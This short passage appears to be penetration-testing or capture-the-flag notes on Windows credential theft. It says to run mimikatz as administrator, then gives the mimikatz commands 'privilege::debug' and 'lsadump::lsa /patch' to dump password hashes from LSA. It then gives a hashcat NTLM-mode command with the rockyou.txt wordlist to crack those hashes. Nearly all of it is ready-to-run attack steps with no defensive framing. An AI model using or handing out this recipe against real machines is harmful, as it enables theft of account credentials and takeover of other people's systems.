We should ensures that we are running mimikatz as an administrator; if we don't run mimikatz as an administrator, mimikatz will not run properly.
```
privilege::debug
```
To dump the hashes:
```
lsadump::lsa /patch
```


**Crack those hashes with hashcat﻿**
```
hashcat -m 1000 <hash> rockyou.txt
```



